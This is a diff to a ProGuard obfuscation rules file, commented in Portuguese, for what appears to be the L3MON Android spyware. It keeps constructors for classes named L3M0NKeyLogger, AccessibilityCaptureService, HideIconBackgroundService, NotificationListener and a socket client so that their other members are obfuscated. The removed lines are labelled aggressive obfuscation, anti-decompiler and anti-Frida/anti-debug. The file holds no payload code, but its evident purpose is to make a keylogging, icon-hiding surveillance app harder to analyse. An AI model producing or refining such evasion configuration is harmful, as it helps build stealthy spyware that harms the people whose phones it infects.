@@ -1,35 +1,30 @@
-# Ofuscação agressiva
--optimizationpasses 5
--allowaccessmodification
--repackageclasses ''
--flattenpackagehierarchy ''
--obfuscationdictionary dictionary.txt
--classobfuscationdictionary dictionary.txt
--packageobfuscationdictionary dictionary.txt
+# ============================================
+# KEEP - Nome da classe mantido (Manifest)
+# Métodos e campos serão ofuscados
+# ============================================
 
-# Manter classes essenciais
--keep class com.etechd.l3mon.** { *; }
--keep class com.etechd.l3mon.IOSocket { *; }
--keep class com.etechd.l3mon.MainService { *; }
--keep class com.etechd.l3mon.L3M0NKeyLogger { *; }
+-keep class com.etechd.l3mon.MainActivity { <init>(...); }
+-keep class com.etechd.l3mon.MainService { <init>(...); }
+-keep class com.etechd.l3mon.L3M0NKeyLogger { <init>(...); }
+-keep class com.etechd.l3mon.AccessibilityCaptureService { <init>(...); }
+-keep class com.etechd.l3mon.NotificationListener { <init>(...); }
+-keep class com.etechd.l3mon.MyReceiver { <init>(...); }
+-keep class com.etechd.l3mon.ServiceReciever { <init>(...); }
 
-# Manter métodos nativos e reflection
--keepclassmembers class * {
-    public static ** get*(...);
-    public static ** set*(...);
-    public ** (android.content.Context);
+# Inner class do Hide Icon
+-keep class com.etechd.l3mon.AccessibilityCaptureService$HideIconBackgroundService { <init>(...); }
+
+# Classes usadas por reflexão
+-keep class com.etechd.l3mon.IOSocket { <init>(...); }
+-keep class com.etechd.l3mon.ConnectionManager { <init>(...); }
+
+# Manter apenas os construtores públicos necessários
+-keepclassmembers class * extends android.app.Service {
+    public <init>(...);
 }
-
-# Anti-decompiler
--dontusemixedcaseclassnames
--dontskipnonpubliclibraryclasses
--dontpreverify
--verbose
-
-# String encryption (básico)
--keepclassmembers class * {
-    <init>(...);
+-keepclassmembers class * extends android.content.BroadcastReceiver {
+    public <init>(...);
 }
-
-# Anti-Frida / Anti-Debug
--keep class * implements android.os.IBinder { *; }
+-keepclassmembers class * extends android.accessibilityservice.AccessibilityService {
+    public <init>(...);
+}
